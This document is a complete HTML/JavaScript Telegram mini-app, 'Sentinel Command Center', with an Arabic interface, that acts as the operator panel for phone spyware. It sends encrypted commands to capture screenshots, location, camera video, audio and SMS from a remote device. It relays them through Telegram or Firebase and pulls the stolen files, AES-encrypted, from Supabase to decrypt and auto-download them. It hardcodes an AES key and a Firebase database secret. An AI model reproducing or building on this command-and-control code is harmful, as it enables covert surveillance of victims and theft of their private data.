<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sentinel Command Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .glass-panel { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); border: 1px solid #30363d; }
        .btn-action { transition: all 0.2s ease-in-out; }
        .btn-action:active { transform: scale(0.95); }
        .console-text { font-family: 'Courier New', Courier, monospace; white-space: pre-wrap; }
        /* لتنسيق شريط التمرير */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0d1117; }
        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 10px; }
    </style>
</head>
<body class="h-screen flex flex-col p-4 overflow-hidden">

    <!-- Header -->
    <div class="w-full flex justify-between items-center mb-4 shrink-0">
        <h1 class="text-xl font-bold text-green-400">🛡️ Sentinel Core</h1>
        <button onclick="openSettings()" class="text-gray-400 hover:text-white text-2xl">⚙️</button>
    </div>

    <!-- Tabs -->
    <div class="flex border-b border-gray-700 mb-4 shrink-0">
        <button id="tab-controls" onclick="switchTab('controls')" class="flex-1 py-2 text-center text-green-400 border-b-2 border-green-400 font-bold">التحكم</button>
        <button id="tab-terminal" onclick="switchTab('terminal')" class="flex-1 py-2 text-center text-gray-500 hover:text-gray-300">الردود (Terminal)</button>
        <button id="tab-media" onclick="switchTab('media')" class="flex-1 py-2 text-center text-gray-500 hover:text-gray-300">الوسائط</button>
    </div>

    <!-- Main Content Area -->
    <div class="flex-1 overflow-y-auto pb-20 relative">
        
        <!-- Controls Tab -->
        <div id="view-controls" class="block w-full">
            <div class="grid grid-cols-3 gap-3 mb-4">
                <button onclick="sendCommand('/screen')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">📸</span><span class="text-xs font-semibold">شاشة</span>
                </button>
                <button onclick="sendCommand('/location')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">📍</span><span class="text-xs font-semibold">الموقع</span>
                </button>
                <button onclick="sendCommand('/video front 10')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">🎥</span><span class="text-xs font-semibold">فيديو أمامي</span>
                </button>
                <button onclick="sendCommand('/audio 10')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">🎙️</span><span class="text-xs font-semibold">تسجيل صوت</span>
                </button>
                <button onclick="sendCommand('/sms')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">💬</span><span class="text-xs font-semibold">رسائل</span>
                </button>
                <button onclick="sendCommand('/getlogs')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center">
                    <span class="text-2xl mb-1">📋</span><span class="text-xs font-semibold">سجلات</span>
                </button>
            </div>
            <!-- Custom Command -->
            <div class="glass-panel rounded-xl p-3 flex gap-2">
                <input type="text" id="customCmd" placeholder="أدخل أمراً (مثال: /info)" class="flex-1 bg-transparent border border-gray-600 rounded px-3 py-2 text-white focus:outline-none focus:border-green-400">
                <button onclick="sendCustomCommand()" class="bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded btn-action">إرسال</button>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div id="view-terminal" class="hidden w-full h-full glass-panel rounded-xl p-3 overflow-y-auto">
            <div id="consoleOutput" class="console-text text-sm text-green-300">
                > بانتظار الاتصال العكسي...<br>
            </div>
        </div>

        <!-- Media Tab -->
        <div id="view-media" class="hidden w-full h-full glass-panel rounded-xl p-3 overflow-y-auto flex flex-col gap-4">
            <div id="mediaGallery" class="w-full text-center text-gray-500 text-sm mt-10">
                لا توجد وسائط مفككة التشفير حالياً.
            </div>
        </div>

    </div>

    <!-- Settings Modal -->
    <div id="settingsModal" class="fixed inset-0 bg-black bg-opacity-90 flex justify-center items-center hidden z-50 p-4">
        <div class="glass-panel w-full max-w-md rounded-xl p-6 shadow-2xl max-h-screen overflow-y-auto">
            <h2 class="text-lg font-bold mb-4 text-white">⚙️ إعدادات النظام العميق</h2>
            <div class="mb-3">
                <label class="block text-xs text-gray-400 mb-1">مفتاح التشفير (AES Key)</label>
                <input type="text" id="aesKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm" value="E&&2EPglZ4Ih43+g*nN4(l87+i7Y9sK&">
            </div>
            <div class="mb-3">
                <label class="block text-xs text-gray-400 mb-1">مسار الإرسال</label>
                <select id="connMode" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm">
                    <option value="telegram">تليجرام (Telegram WebApp)</option>
                    <option value="firebase">فايربيز المباشر (Firebase REST)</option>
                </select>
            </div>
            <div class="mb-3 border-t border-gray-700 pt-3">
                <label class="block text-xs text-blue-400 mb-1 font-bold">إعدادات قاعدة البيانات (Firebase)</label>
                <input type="text" id="fbUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm mb-2" placeholder="Firebase URL">
                <input type="text" id="fbSecret" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm" placeholder="Database Secret">
            </div>
            <div class="mb-3 border-t border-gray-700 pt-3">
                <label class="block text-xs text-purple-400 mb-1 font-bold">إعدادات السحابة لتنزيل الملفات (Supabase)</label>
                <input type="text" id="sbUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm mb-2" placeholder="Supabase URL">
                <input type="text" id="sbKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm mb-2" placeholder="Supabase API Key">
                <input type="text" id="sbBucket" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm" placeholder="Bucket Name (e.g., pg-files)" value="pg-files">
            </div>
            <div class="flex justify-end gap-2 mt-4">
                <button onclick="closeSettings()" class="px-4 py-2 rounded border border-gray-600 hover:bg-gray-800 text-sm">إلغاء</button>
                <button onclick="saveSettings()" class="px-4 py-2 rounded bg-green-600 hover:bg-green-500 text-white font-bold text-sm">حفظ والاتصال</button>
            </div>
        </div>
    </div>

    <!-- Toast -->
    <div id="toast" class="fixed top-5 left-1/2 transform -translate-x-1/2 bg-blue-600 text-white px-4 py-2 rounded-full shadow-lg opacity-0 transition-opacity duration-300 pointer-events-none z-50 text-sm"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        let listenerInterval = null;
        let lastProcessedKey = null;

        // ================= UI Logic =================
        function switchTab(tab) {
            document.getElementById('view-controls').classList.add('hidden');
            document.getElementById('view-terminal').classList.add('hidden');
            document.getElementById('view-media').classList.add('hidden');
            
            document.getElementById('tab-controls').classList.replace('text-green-400', 'text-gray-500');
            document.getElementById('tab-controls').classList.remove('border-b-2', 'border-green-400');
            document.getElementById('tab-terminal').classList.replace('text-green-400', 'text-gray-500');
            document.getElementById('tab-terminal').classList.remove('border-b-2', 'border-green-400');
            document.getElementById('tab-media').classList.replace('text-green-400', 'text-gray-500');
            document.getElementById('tab-media').classList.remove('border-b-2', 'border-green-400');

            document.getElementById('view-' + tab).classList.remove('hidden');
            document.getElementById('tab-' + tab).classList.replace('text-gray-500', 'text-green-400');
            document.getElementById('tab-' + tab).classList.add('border-b-2', 'border-green-400');
        }

        function showToast(msg, isError = false) {
            const toast = document.getElementById('toast');
            toast.innerText = msg;
            toast.className = `fixed top-5 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-full shadow-lg transition-opacity duration-300 pointer-events-none z-50 text-sm ${isError ? 'bg-red-600' : 'bg-blue-600'}`;
            toast.classList.remove('opacity-0');
            toast.classList.add('opacity-100');
            setTimeout(() => {
                toast.classList.remove('opacity-100');
                toast.classList.add('opacity-0');
            }, 3000);
        }

        function logToTerminal(text) {
            const consoleOut = document.getElementById('consoleOutput');
            const time = new Date().toLocaleTimeString();
            consoleOut.innerHTML += `<br><span class="text-gray-500">[${time}]</span> ${text}`;
            consoleOut.parentElement.scrollTop = consoleOut.parentElement.scrollHeight;
        }

        // ================= Cryptography (Web Crypto API for speed & large files) =================
        
        // تشفير النصوص (لإرسال الأوامر)
        function encryptTextAES(plainText, secretKeyStr) {
            try {
                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
                const iv = CryptoJS.lib.WordArray.random(16);
                const encrypted = CryptoJS.AES.encrypt(plainText, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                const combined = iv.clone().concat(encrypted.ciphertext);
                return CryptoJS.enc.Base64.stringify(combined);
            } catch (error) {
                showToast("خطأ في تشفير الأمر", true);
                return null;
            }
        }

        // فك تشفير النصوص (للردود)
        function decryptTextAES(encryptedBase64, secretKeyStr) {
            try {
                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
                const encryptedBytes = CryptoJS.enc.Base64.parse(encryptedBase64);
                
                const iv = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(0, 4));
                const ciphertext = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(4), encryptedBytes.sigBytes - 16);
                
                const decrypted = CryptoJS.AES.decrypt({ ciphertext: ciphertext }, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return decrypted.toString(CryptoJS.enc.Utf8);
            } catch (error) {
                return "ERROR_DECRYPT";
            }
        }

        // فك تشفير الملفات الكبيرة باستخدام Web Crypto API (عالية الأداء في RAM)
        async function decryptFileAES(encryptedArrayBuffer, secretKeyStr) {
            const enc = new TextEncoder();
            const keyMaterial = await window.crypto.subtle.importKey(
                "raw",
                enc.encode(secretKeyStr).slice(0, 32), // التأكد من أنه 32 بايت
                { name: "AES-CBC" },
                false,
                ["decrypt"]
            );

            const iv = encryptedArrayBuffer.slice(0, 16);
            const ciphertext = encryptedArrayBuffer.slice(16);

            try {
                const decryptedBuffer = await window.crypto.subtle.decrypt(
                    { name: "AES-CBC", iv: new Uint8Array(iv) },
                    keyMaterial,
                    ciphertext
                );
                return decryptedBuffer;
            } catch (e) {
                console.error("File Decryption Error:", e);
                throw e;
            }
        }

        // ================= Sending Commands =================
        function sendCommand(cmd) {
            const aesKey = localStorage.getItem('aesKey');
            const mode = localStorage.getItem('connMode') || 'telegram';

            if (!aesKey) { openSettings(); return; }

            const encryptedData = encryptTextAES(cmd, aesKey);
            if (!encryptedData) return;

            logToTerminal(`<span class="text-yellow-400">إرسال:</span> ${cmd}`);

            if (mode === 'telegram') {
                tg.sendData(encryptedData);
                showToast("تم الإرسال لتيليجرام");
            } else {
                const fbUrl = localStorage.getItem('fbUrl');
                const fbSecret = localStorage.getItem('fbSecret');
                if (!fbUrl || !fbSecret) { showToast("إعدادات فايربيز مفقودة", true); return; }

                const payload = { cmd: encryptedData, status: "pending", reply_to: "PYTHON_FIREBASE" };
                fetch(`${fbUrl}/current_command.json?auth=${fbSecret}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(res => {
                    if(res.ok) showToast("تم الإرسال للسحابة");
                    else showToast("فشل الإرسال", true);
                }).catch(err => showToast("خطأ شبكة", true));
            }
        }

        function sendCustomCommand() {
            const cmd = document.getElementById('customCmd').value;
            if(cmd.trim() !== '') {
                sendCommand(cmd);
                document.getElementById('customCmd').value = '';
            }
        }

        // ================= Receiving & Processing Responses =================
        function startListening() {
            const fbUrl = localStorage.getItem('fbUrl');
            const fbSecret = localStorage.getItem('fbSecret');
            const aesKey = localStorage.getItem('aesKey');

            if (!fbUrl || !fbSecret || !aesKey) return;

            if (listenerInterval) clearInterval(listenerInterval);

            logToTerminal("📡 بدء الاستماع المشفر لقناة الردود...");

            // جلب أحدث رد كل ثانيتين
            listenerInterval = setInterval(async () => {
                try {
                    // نجلب آخر عنصر تم إضافته لقاعدة البيانات
                    const res = await fetch(`${fbUrl}/responses.json?auth=${fbSecret}&orderBy="$key"&limitToLast=1`);
                    const data = await res.json();
                    
                    if (data) {
                        const keys = Object.keys(data);
                        if (keys.length > 0) {
                            const latestKey = keys[0];
                            if (latestKey !== lastProcessedKey) {
                                lastProcessedKey = latestKey;
                                const encryptedPayload = data[latestKey].data;
                                
                                const plainResponse = decryptTextAES(encryptedPayload, aesKey);
                                
                                if (plainResponse && plainResponse !== "ERROR_DECRYPT") {
                                    handleDecryptedResponse(plainResponse);
                                }
                            }
                        }
                    }
                } catch (e) {
                    // صمت عند خطأ الشبكة المؤقت
                }
            }, 2000);
        }

        async function handleDecryptedResponse(text) {
            logToTerminal(`<span class="text-blue-400">استقبال:</span>\n${text}`);
            showToast("تم استقبال بيانات جديدة");

            // التقاط اسم الملف المشفر (الذي ينتهي بـ .enc وموجود بين علامتي ` `)
            const match = text.match(/`([^`]+\.enc)`/);
            
            // التأكد من أن الرسالة تؤكد نجاح الرفع السحابي أو وجود الملف مسبقاً
            const isUploadSuccess = text.includes("SUPABASE UPLOAD SUCCESSFUL") || 
                                    text.includes("تمت أرشفة الملف") || 
                                    text.includes("موجود مسبقاً");

            if (match && match[1] && isUploadSuccess) {
                const fileName = match[1];
                logToTerminal(`⏳ جاري سحب الملف المشفر من السحابة وفكه بالذاكرة: ${fileName}`);
                await fetchAndProcessFile(fileName);
            }
        }

        // ================= File Downloading & In-Memory Processing =================
        async function fetchAndProcessFile(fileName) {
            const sbUrl = localStorage.getItem('sbUrl');
            const sbKey = localStorage.getItem('sbKey');
            const sbBucket = localStorage.getItem('sbBucket');
            const aesKey = localStorage.getItem('aesKey');

            if (!sbUrl || !sbKey || !sbBucket) {
                logToTerminal(`<span class="text-red-400">فشل:</span> إعدادات Supabase غير مكتملة لسحب الملف.`);
                return;
            }

            try {
                // تحميل الملف المشفر من Supabase
                const fileUrl = `${sbUrl}/storage/v1/object/${sbBucket}/${fileName}`;
                const response = await fetch(fileUrl, {
                    headers: { 'apikey': sbKey, 'Authorization': `Bearer ${sbKey}` }
                });

                if (!response.ok) throw new Error("فشل التحميل من Supabase");

                const encryptedBuffer = await response.arrayBuffer();
                
                // فك التشفير داخل RAM
                const decryptedBuffer = await decryptFileAES(encryptedBuffer, aesKey);

                // استنتاج نوع الملف للاستخدام في المتصفح
                let mimeType = 'application/octet-stream';
                if (fileName.includes('.mp4')) mimeType = 'video/mp4';
                else if (fileName.includes('.jpg') || fileName.includes('.png')) mimeType = 'image/jpeg';
                else if (fileName.includes('.m4a') || fileName.includes('.mp3')) mimeType = 'audio/mp4';
                else if (fileName.includes('.txt')) mimeType = 'text/plain';

                // تحويل البايتات إلى Blob (ملف وهمي في الذاكرة)
                const blob = new Blob([decryptedBuffer], { type: mimeType });
                const blobUrl = URL.createObjectURL(blob);

                // إزالة الامتداد .enc إذا كان موجوداً
                const originalName = fileName.replace('.enc', '');

                logToTerminal(`<span class="text-green-400">نجاح:</span> تم فك تشفير الملف بالكامل في الذاكرة.`);
                
                // عرض الملف في شاشة الوسائط
                displayMedia(blobUrl, mimeType, originalName);

                // الحفظ التلقائي الصامت لمجلد التنزيلات الخاص بالمستخدم
                autoDownloadBlob(blobUrl, originalName);

            } catch (e) {
                logToTerminal(`<span class="text-red-400">خطأ أثناء المعالجة:</span> ${e.message}`);
            }
        }

        function displayMedia(blobUrl, mimeType, fileName) {
            const gallery = document.getElementById('mediaGallery');
            if (gallery.innerText.includes("لا توجد وسائط")) gallery.innerHTML = ''; // تفريغ الرسالة الافتراضية

            const container = document.createElement('div');
            container.className = 'glass-panel p-3 rounded-xl flex flex-col gap-2 items-center';

            const title = document.createElement('span');
            title.className = 'text-xs text-gray-400 break-all';
            title.innerText = fileName;
            container.appendChild(title);

            if (mimeType.startsWith('video/')) {
                container.innerHTML += `<video src="${blobUrl}" controls class="w-full rounded" style="max-height: 300px;"></video>`;
            } else if (mimeType.startsWith('image/')) {
                container.innerHTML += `<img src="${blobUrl}" class="w-full rounded" style="max-height: 300px; object-fit: contain;">`;
            } else if (mimeType.startsWith('audio/')) {
                container.innerHTML += `<audio src="${blobUrl}" controls class="w-full"></audio>`;
            } else if (mimeType === 'text/plain') {
                // جلب النص وعرضه
                fetch(blobUrl).then(r => r.text()).then(txt => {
                    const pre = document.createElement('pre');
                    pre.className = 'text-xs text-left text-gray-300 w-full overflow-x-auto p-2 bg-black rounded';
                    pre.style.maxHeight = '200px';
                    pre.innerText = txt;
                    container.appendChild(pre);
                });
            } else {
                container.innerHTML += `<span class="text-3xl">📁</span><a href="${blobUrl}" download="${fileName}" class="text-blue-400 text-sm mt-2">انقر للتحميل يدوياً</a>`;
            }

            gallery.prepend(container); // إضافة الأحدث بالأعلى
            switchTab('media'); // الانتقال التلقائي لشاشة الوسائط
            showToast("تم تجهيز ملف جديد");
        }

        // دالة إجبار المتصفح على تحميل الملف لمجلد التنزيلات
        function autoDownloadBlob(blobUrl, fileName) {
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = blobUrl;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            logToTerminal(`تم تمرير الملف [${fileName}] لمجلد التنزيلات الخاص بك بأمان.`);
        }

        // ================= Settings & Init =================
        function openSettings() {
            document.getElementById('aesKey').value = localStorage.getItem('aesKey') || 'E&&2EPglZ4Ih43+g*nN4(l87+i7Y9sK&';
            document.getElementById('connMode').value = localStorage.getItem('connMode') || 'telegram';
            document.getElementById('fbUrl').value = localStorage.getItem('fbUrl') || 'https://andpro-f97c0-default-rtdb.firebaseio.com';
            document.getElementById('fbSecret').value = localStorage.getItem('fbSecret') || 's7tKwCRQktjNaNcidEcGZDAYI1dzC0vztLyneFB9';
            
            document.getElementById('sbUrl').value = localStorage.getItem('sbUrl') || 'https://paiqcvaitggnrzkzvivm.supabase.co';
            document.getElementById('sbKey').value = localStorage.getItem('sbKey') || '';
            document.getElementById('sbBucket').value = localStorage.getItem('sbBucket') || 'pg-files';

            document.getElementById('settingsModal').classList.remove('hidden');
        }

        function closeSettings() {
            document.getElementById('settingsModal').classList.add('hidden');
        }

        function saveSettings() {
            localStorage.setItem('aesKey', document.getElementById('aesKey').value.trim());
            localStorage.setItem('connMode', document.getElementById('connMode').value);
            
            localStorage.setItem('fbUrl', document.getElementById('fbUrl').value.trim());
            localStorage.setItem('fbSecret', document.getElementById('fbSecret').value.trim());
            
            localStorage.setItem('sbUrl', document.getElementById('sbUrl').value.trim());
            localStorage.setItem('sbKey', document.getElementById('sbKey').value.trim());
            localStorage.setItem('sbBucket', document.getElementById('sbBucket').value.trim());

            closeSettings();
            showToast("تم الحفظ وبدء الاتصال...");
            startListening(); // إعادة تشغيل المستمع بالإعدادات الجديدة
        }

        // التشغيل التلقائي عند فتح الميني آب
        window.onload = () => {
            if (!localStorage.getItem('aesKey') || !localStorage.getItem('fbSecret')) {
                openSettings();
            } else {
                startListening();
            }
        };
    </script>
</body>
</html>
